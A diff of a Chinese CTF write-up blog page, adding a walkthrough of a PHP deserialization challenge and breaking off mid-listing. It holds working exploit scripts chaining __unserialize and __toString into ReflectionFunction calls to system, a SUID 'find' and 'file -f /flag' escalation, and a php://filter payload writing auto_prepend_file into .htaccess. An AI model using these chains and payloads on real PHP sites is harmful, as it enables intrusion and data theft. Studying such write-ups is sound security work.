@@ -334,8 +334,23 @@
         <li><a href="#js污染链http同名参数转换为数组绕过逗号">js污染链+http同名参数转换为数组绕过逗号</a></li>
       </ol>
     </li>
-    <li><a href="#php不比java差">PHP不比Java差</a></li>
-    <li><a href="#funnysql">funnySQL</a></li>
+    <li><a href="#php不比java差">PHP不比Java差</a>
+      <ol>
+        <li><a href="#考点利用reflectionfunction反射调用system来rce">考点：利用<code>ReflectionFunction</code>反射调用system来rce</a></li>
+        <li><a href="#非预期array_shift和implode直接触发tostring">非预期：array_shift和implode直接触发toString</a></li>
+        <li><a href="#预期利用数组进行对象的类的调用file_触发__tostring"><strong>预期：利用数组进行对象的类的调用+file_exists</strong>触发__toString</a></li>
+      </ol>
+    </li>
+    <li><a href="#funnysql">funnySQL</a>
+      <ol>
+        <li><a href="#考点过滤sleepbenchmark与ormysqlinnodb_table_stats-查表与asciiordhex代替timetime精准测量延时">考点：过滤sleep（benchmark）与or（mysql.innodb_table_stats 查表）与ascii,ord(hex代替)+time.time()精准测量延时</a></li>
+      </ol>
+    </li>
+    <li><a href="#not_just_pop">not_just_pop</a>
+      <ol>
+        <li><a href="#考点蚁剑插件绕过disable_function">考点：蚁剑插件绕过disable_function</a></li>
+      </ol>
+    </li>
   </ol>
 </nav>
         </div>
@@ -404,7 +419,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 15 分钟
+                    阅读时长: 23 分钟
                 </time>
             </div>
         
@@ -632,12 +647,12 @@
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl">	<span class="err">当打入这个</span><span class="n">payload时</span><span class="err">，就会有`</span><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span> <span class="n">exit</span><span class="p">();</span><span class="n">php</span><span class="p">:</span><span class="o">//</span><span class="n">filter</span><span class="o">/</span><span class="n">write</span><span class="o">=</span><span class="n">string</span><span class="o">.</span><span class="n">strip_tags</span><span class="o">/</span><span class="err">?</span><span class="o">&gt;</span><span class="n">php_value</span> <span class="n">auto_prepend_file</span> <span class="o">/</span><span class="n">flag</span><span class="o">&lt;/</span><span class="n">resource</span><span class="o">=.</span><span class="n">htaccess</span><span class="err">`写入到</span><span class="o">.</span><span class="n">htaccess</span><span class="p">,</span><span class="err">由于这个第一个</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">starven</span><span class="err">（其实就是</span><span class="n">payload</span><span class="err">）有</span><span class="n">strip_tags</span><span class="err">，会除去</span><span class="n">php与html标签</span><span class="err">，所以</span><span class="o">&lt;</span><span class="err">?</span> <span class="o">...</span><span class="err">?</span><span class="o">&gt;</span><span class="err">的全部除去，</span><span class="o">&lt;/</span><span class="n">resource</span><span class="o">=.</span><span class="n">htaccess被识别为html标签也同样除去</span><span class="err">，所以就`</span><span class="n">php_value</span> <span class="n">auto_prepend_file</span> <span class="o">/</span><span class="n">flag</span><span class="err">`写到了</span><span class="o">.</span><span class="n">htaccess</span>
-</span></span><span class="line"><span class="cl">	
-</span></span><span class="line"><span class="cl">	<span class="err">有人可能疑问，为什么第一个</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">starven</span><span class="err">（</span><span class="n">payload</span><span class="err">）不像一个正常的伪协议语句，也发挥了伪协议作用，这是因为路径解析的宽容性：在</span> <span class="n">php</span><span class="p">:</span><span class="o">//</span><span class="n">filter</span><span class="o">/</span> <span class="err">和</span> <span class="o">/</span><span class="n">resource</span><span class="o">=</span> <span class="err">之间插入一些“非标准”的字符串（比如</span><span class="n">payload</span><span class="err">），并不会让整个解析过程失败。</span><span class="n">PHP会尝试执行它认识的过滤器</span><span class="err">，并忽略它不认识的部分。</span>
-</span></span><span class="line"><span class="cl">	
-</span></span><span class="line"><span class="cl">	<span class="err">那为什么另一种</span><span class="n">payload这个</span><span class="c1">#前需要换行，因为不换行遇到#，就会认为“路径到此结束，后面的内容（包括 /resource=.htaccess）就失效了，意味这第一个$this-&gt;starven中找不到/resource=.htaccess这个指令，就不知道要把东西写到哪里去。这会导致file_put_contents写入文件失败。而在第二个$this-&gt;starven中，其与死亡代码写入.htaccess中，但是当Apache来读取这个.htaccess文件时，它看到#，就会认为“从#开始，这一行的后面所有内容都是注释，全部忽略结果是auto_prepend_file /flag 这个关键的配置指令因为后面紧跟着#，被Apache当作注释或无效配置给忽略掉了。</span>
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">	<span class="nx">当打入这个payload时，就会有</span><span class="sb">`&lt;?php exit();php://filter/write=string.strip_tags/?&gt;php_value auto_prepend_file /flag&lt;/resource=.htaccess`</span><span class="nx">写入到</span><span class="o">.</span><span class="nx">htaccess</span><span class="p">,</span><span class="nx">由于这个第一个</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">starven（其实就是payload）有strip_tags，会除去php与html标签，所以</span><span class="o">&lt;?</span> <span class="o">...</span><span class="cp">?&gt;</span><span class="err">的全部除去，&lt;/resource=.htaccess被识别为html标签也同样除去，所以就`php_value auto_prepend_file /flag`写到了.htaccess
+</span></span></span><span class="line"><span class="cl"><span class="err">	
+</span></span></span><span class="line"><span class="cl"><span class="err">	有人可能疑问，为什么第一个$this-&gt;starven（payload）不像一个正常的伪协议语句，也发挥了伪协议作用，这是因为路径解析的宽容性：在 php://filter/ 和 /resource= 之间插入一些“非标准”的字符串（比如payload），并不会让整个解析过程失败。PHP会尝试执行它认识的过滤器，并忽略它不认识的部分。
+</span></span></span><span class="line"><span class="cl"><span class="err">	
+</span></span></span><span class="line"><span class="cl"><span class="err">	那为什么另一种payload这个#前需要换行，因为不换行遇到#，就会认为“路径到此结束，后面的内容（包括 /resource=.htaccess）就失效了，意味这第一个$this-&gt;starven中找不到/resource=.htaccess这个指令，就不知道要把东西写到哪里去。这会导致file_put_contents写入文件失败。而在第二个$this-&gt;starven中，其与死亡代码写入.htaccess中，但是当Apache来读取这个.htaccess文件时，它看到#，就会认为“从#开始，这一行的后面所有内容都是注释，全部忽略结果是auto_prepend_file /flag 这个关键的配置指令因为后面紧跟着#，被Apache当作注释或无效配置给忽略掉了。
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="rce_me">rce_me
 </h2><h3 id="php51的intval比较漏洞preg_match与stripos遇见数组返回false">php5.1的intval比较漏洞+preg_match与stripos遇见数组返回false
@@ -2142,7 +2157,8 @@
 	
 ></p>
 <h2 id="php不比java差">PHP不比Java差
-</h2><div class="highlight"><div class="chroma">
+</h2><h3 id="考点利用reflectionfunction反射调用system来rce">考点：利用<code>ReflectionFunction</code>反射调用system来rce
+</h3><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -2182,50 +2198,1015 @@
 </span><span class="lnt">36
 </span><span class="lnt">37
 </span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">class Challenge{
-</span></span><span class="line"><span class="cl">    public $file;
-</span></span><span class="line"><span class="cl">    public function Sink()
-</span></span><span class="line"><span class="cl">    {
-</span></span><span class="line"><span class="cl">        echo &#34;&lt;br&gt;!!!A GREAT STEP!!!&lt;br&gt;&#34;;
-</span></span><span class="line"><span class="cl">        echo &#34;Is there any file?&lt;br&gt;&#34;;
-</span></span><span class="line"><span class="cl">        if(file_exists($this-&gt;file)){
-</span></span><span class="line"><span class="cl">            global $FLAG;
-</span></span><span class="line"><span class="cl">            echo $FLAG;
-</span></span><span class="line"><span class="cl">        }
-</span></span><span class="line"><span class="cl">    }
-</span></span><span class="line"><span class="cl">}
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s2">&#34;secret.php&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">class Geek{
-</span></span><span class="line"><span class="cl">    public $a;
-</span></span><span class="line"><span class="cl">    public $b;
-</span></span><span class="line"><span class="cl">    public function __unserialize(array $data): void
-</span></span><span class="line"><span class="cl">    {
-</span></span><span class="line"><span class="cl">        $change=$_GET[&#34;change&#34;];
-</span></span><span class="line"><span class="cl">        $FUNC=$change($data);
-</span></span><span class="line"><span class="cl">        $FUNC();
-</span></span><span class="line"><span class="cl">    }
-</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Challenge</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$file</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">Sink</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;!!!A GREAT STEP!!!&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;Is there any file?&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">            <span class="k">global</span> <span class="nv">$FLAG</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="nv">$FLAG</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">class Syclover{
-</span></span><span class="line"><span class="cl">    public $Where;
-</span></span><span class="line"><span class="cl">    public $IS;
-</span></span><span class="line"><span class="cl">    public $Starven;
-</span></span><span class="line"><span class="cl">    public $Girlfriend;
-</span></span><span class="line"><span class="cl">    public function __toString()
-</span></span><span class="line"><span class="cl">    {
-</span></span><span class="line"><span class="cl">        echo &#34;__toString is called&lt;br&gt;&#34;;
-</span></span><span class="line"><span class="cl">        $eee=new $this-&gt;Where($this-&gt;IS);
-</span></span><span class="line"><span class="cl">        $fff=$this-&gt;Starven;
-</span></span><span class="line"><span class="cl">        $eee-&gt;$fff($this-&gt;Girlfriend);
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Geek</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$a</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$b</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">__unserialize</span><span class="p">(</span><span class="k">array</span> <span class="nv">$data</span><span class="p">)</span><span class="o">:</span> <span class="nx">void</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$change</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;change&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$FUNC</span><span class="o">=</span><span class="nv">$change</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$FUNC</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Syclover</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$Where</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$IS</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$Starven</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$Girlfriend</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;__toString is called&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$eee</span><span class="o">=</span><span class="k">new</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">Where</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">IS</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$fff</span><span class="o">=</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">Starven</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$eee</span><span class="o">-&gt;</span><span class="nv">$fff</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">Girlfriend</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">       
-</span></span><span class="line"><span class="cl">    }
-</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">unserialize</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">]);</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h2 id="funnysql">funnySQL
-</h2>
+</div><h3 id="非预期array_shift和implode直接触发tostring">非预期：array_shift和implode直接触发toString
+</h3><p>这里起点肯定是<code>__unserialize</code>,这个方法里面可以看到有   <code>$FUNC();</code>而且还是可控的，所以可以构造<code>phpinfo()</code>.如何构造呢？可以传入<code>change</code>为<code>array_shift</code>(删除数组中的第一个元素，并返回被删除的元素：),<a class="link" href="https://www.runoob.com/php/func-array-shift.html"  target="_blank" rel="noopener"
+    >PHP array_shift() 函数 | 菜鸟教程</a>,然后data传phpinfo</p>
+<p>（<code>$data</code> <strong>默认包含所有 <code>public</code> 属性</strong>（ <code>a</code> 和 <code>b</code>），但 <strong>不强制要求</strong> 都必须传入值）代码如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Geek</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$a</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$b</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Syclover</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$Where</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$IS</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$Starven</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$Girlfriend</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">Geek</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">a</span><span class="o">=</span><span class="s2">&#34;phpinfo&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现环境压根没有flag。</p>
+<img src="image-20250726201401201.png" alt="image-20250726201401201" style="zoom: 25%;" />
+<p>（当然这里<code>change</code>也可以用<code>implode</code>：回由数组元素组合成的字符串，其实就是打印数组中的元素<a class="link" href="https://www.w3school.com.cn/php/func_string_implode.asp"  target="_blank" rel="noopener"
+    >PHP implode() 函数</a>）</p>
+<p>没有flag，这里我们肯定是想着继续往下走，那肯定要走到<code>__toString</code>里面去才有操作空间,而我们只需要将<code>Geek</code>的$a（也就是array $data第一个元素）赋值为<code>new Syclover()</code>,<code>array_shift</code>或<code>implode</code>就可以触发了<code>__toString</code>了(都将对象当字符串处理)。接下来呢？</p>
+<p>我们怎么对下面操作？题目说php不必java差，很容易想到java的反射机制，这就要用到一个原生类<code>ReflectionFunction</code>了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">        <span class="nv">$eee</span><span class="o">=</span><span class="k">new</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">Where</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">IS</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$fff</span><span class="o">=</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">Starven</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$eee</span><span class="o">-&gt;</span><span class="nv">$fff</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">Girlfriend</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>其可以用<strong>函数invoke。</strong></p>
+<img src="image-20250726203927833.png" alt="image-20250726203927833" style="zoom:50%;" />
+<p><a class="link" href="https://www.php.net/manual/en/reflectionfunction.invoke.php"  target="_blank" rel="noopener"
+    >PHP: ReflectionFunction::invoke - Manual</a></p>
+<p>exp如下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Geek</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$a</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$b</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Syclover</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$Where</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$IS</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$Starven</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$Girlfriend</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">Geek</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">a</span><span class="o">=</span><span class="k">new</span> <span class="nx">Syclover</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">a</span><span class="o">-&gt;</span><span class="na">Where</span><span class="o">=</span><span class="s2">&#34;ReflectionFunction&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">a</span><span class="o">-&gt;</span><span class="na">IS</span><span class="o">=</span><span class="s2">&#34;system&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">a</span><span class="o">-&gt;</span><span class="na">Starven</span><span class="o">=</span><span class="s2">&#34;invoke&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">a</span><span class="o">-&gt;</span><span class="na">Girlfriend</span><span class="o">=</span><span class="s2">&#34;file -f /flag&#34;</span><span class="p">;</span> <span class="c1">//rce后发现读不了flag，根目录有hint.txt，提示我们要提权，打find / -user root -perm -4000 -print 2&gt;/dev/null后发现可以file有suid权限，之后打file -f /flag就行
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="image-20250726205320998.png" alt="image-20250726205320998" style="zoom:33%;" />
+<img src="image-20250726205522132.png" alt="image-20250726205522132" style="zoom:33%;" />
+<p><a class="link" href="https://gtfobins.github.io/gtfobins/file/"  target="_blank" rel="noopener"
+    >file | GTFOBins</a></p>
+<p>其也可以<strong>调用函数<code>invokeArgs</code>。</strong></p>
+<img src="image-20250726202630905.png" alt="image-20250726202630905" style="zoom:50%;" />
+<p><a class="link" href="https://www.php.net/manual/en/reflectionfunction.invokeargs.php"  target="_blank" rel="noopener"
+    >PHP: ReflectionFunction::invokeArgs - Manual</a></p>
+<p>只不过执行命令需要借助<code>call_user_func</code>函数(<a class="link" href="https://blog.csdn.net/huaweichenai/article/details/110670301"  target="_blank" rel="noopener"
+    >了解php中call_user_func 与 call_user_func_array的使用及区别-CSDN博客</a>)，不多说，直接上exp</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Geek</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$a</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$b</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Syclover</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$Where</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$IS</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$Starven</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$Girlfriend</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">Geek</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">a</span><span class="o">=</span><span class="k">new</span> <span class="nx">Syclover</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">a</span><span class="o">-&gt;</span><span class="na">Where</span><span class="o">=</span><span class="s1">&#39;ReflectionFunction&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">a</span><span class="o">-&gt;</span><span class="na">IS</span><span class="o">=</span><span class="s1">&#39;call_user_func&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">a</span><span class="o">-&gt;</span><span class="na">Starven</span><span class="o">=</span><span class="s1">&#39;invokeArgs&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">a</span><span class="o">-&gt;</span><span class="na">Girlfriend</span><span class="o">=</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">,</span><span class="s1">&#39;file -f /flag&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>不过这是我看了别人的wp写的，没用到Challenge中的Sink，看了wp的解法**。**</p>
+<h3 id="预期利用数组进行对象的类的调用file_触发__tostring"><strong>预期：利用数组进行对象的类的调用+file_exists</strong>触发__toString
+</h3><p>利用数组进行对象的类的调用进入到Sink，不过注意此处返回的数组（$data）为一个关联形的数组</p>
+<img src="image-20250726211912955.png" alt="image-20250726211912955" style="zoom:50%;" />
+<p>利用 $FUNC() 进行数组调用类的方法时需要注意，该数组类型应该为索引数组</p>
+<img src="image-20250726212338722.png" alt="image-20250726212338722" style="zoom:50%;" />
+<p><strong>将关联形数组转变为索引数组，此处采用 array_values 取关联形数组的值转变为索引数组</strong></p>
+<p><a class="link" href="https://www.php.net/manual/zh/function.array-values.php"  target="_blank" rel="noopener"
+    >PHP: array_values - Manual</a></p>
+<p>然后到了Sink里面，<strong>file_exists其会把传入的变量作为字符串类型去处理，因此当传入一个类时也会把类作为string类型进行处理，从而自动触发对应类当中的 __toString 魔术方法</strong>，后面就一样了。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
